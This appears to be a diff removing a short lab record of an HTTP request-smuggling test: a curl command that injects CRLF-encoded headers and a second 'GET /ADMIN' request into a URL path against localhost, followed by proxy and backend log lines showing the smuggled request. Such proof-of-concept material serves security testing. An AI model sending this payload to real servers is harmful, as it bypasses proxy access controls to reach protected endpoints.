@@ -1,5 +1,0 @@
-curl  -s -k -X GET 'http://localhost/categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/ADMIN'; echo
-
-
-backend-server_1  | 172.24.0.3 - - [08/Sep/2023:14:43:43 +0000] "GET /xxxxx HTTP/1.1" 404 653 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
-apache-proxy_1    | 172.24.0.1 - - [08/Sep/2023:14:43:43 +0000] "GET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/xxxxx HTTP/1.1" 200 21
